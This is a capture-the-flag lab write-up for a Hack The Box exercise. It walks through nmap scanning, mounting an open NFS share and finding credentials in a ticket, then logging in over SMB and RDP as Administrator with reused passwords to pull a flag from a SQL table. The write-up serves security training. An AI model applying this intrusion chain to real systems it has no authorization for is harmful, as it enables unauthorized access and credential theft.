### Footprint Medium Lab Exercise
 
IP: 10.129.202.41
 
---
 
### Question 1:
Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.
 
I start off with an nmap scan against the target, wanting to get an idea for what services are being hosted.
 
```diff
+ $ nmap -A -sV -sC -Pn -n 10.129.202.41
```
 
	PORT     STATE SERVICE       VERSION
	111/tcp  open  rpcbind       2-4 (RPC #100000)
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	2049/tcp open  nlockmgr      1-4 (RPC #100021)
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 
From this I can see multiple services like RDP, NFS, SMB, and WMI. I start off with mounting NFS to see what I can gather.
 
```diff
+ $ sudo mount -t nfs 10.129.202.41:/ ./target-NFS -o nolock
```
 
Listing all in the mounted directory, I find a Techsupport directory. Looking inside are many tickets; trying to `cat` some, I can see that nothing outputs. I try listing with `-la` and notice that the majority have no data on them, except one. Examining that one shows a ticket revealing credentials for a user.
 
	1smtp {
	 2    host=smtp.web.dev.inlanefreight.htb
	 3    #port=25
	 4    ssl=true
	 5    user="alex"
	 6    password="lol123!mD"
	 7    from="alex.g@web.dev.inlanefreight.htb"
	 8}
 
I test these credentials against SMB, which gives me access to user alex.
 
```diff
+ $ smbclient -U alex //10.129.202.41/users
```
 
Exploring around, I find a devshare in alex's home directory, which contains an important.txt. Using `more` against it reveals credentials to a SQL account, sa:87N1ns@slls83.
 
```diff
+ smb: \alex\> cd devshare\
+ smb: \alex\devshare\> more important.txt
```
 
	getting file \alex\devshare\important.txt of size 16 as /tmp/smbmore.SsuLLy (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
 
I then try to RDP, testing these credentials against the Administrator user, which works.
 
```diff
+ $ xfreerdp /u:Administrator /p:"87N1ns@slls83" /v:10.129.202.41
```
 
Now RDP'd as the Administrator, I look over to the SQL Server Management Studio and find a database named accounts containing a table named dbo.devsacc. Querying this database for the HTB user gives me their password.
 
```diff
+ SELECT * FROM dbo.devsacc WHERE username = 'HTB';
```
 
	lnch7ehrdn43i7AoqVPK4zWR
 
&#x1F6A9; found **lnch7ehrdn43i7AoqVPK4zWR**.
